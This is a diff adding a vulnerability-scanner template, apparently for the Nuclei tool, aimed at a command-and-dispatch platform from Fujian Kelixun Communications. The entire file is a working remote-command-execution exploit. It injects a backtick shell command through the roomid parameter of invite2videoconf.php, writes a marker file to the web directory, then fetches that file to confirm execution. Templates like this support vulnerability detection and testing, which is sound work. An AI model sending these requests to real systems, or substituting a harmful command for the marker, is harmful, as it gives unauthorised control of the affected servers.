@@ -1,0 +1,36 @@
+id: kelixun-invite2videoconf-rce
+
+info:
+  name: 福建科立讯通信有限公司的指挥调度平台invite2videoconf.php命令执行漏洞
+  author: kelixun
+  severity: critical
+  tags: kelixun
+
+http:
+  - raw:
+      - |+
+        GET /api/client/invite2videoconf.php?callee=1&roomid=`echo+{{randstr}}>sectest2026.txt` HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+
+      - |+
+        GET /api/client/sectest2026.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body_2
+        words:
+          - '{{randstr}}'
+    matchers-condition: and
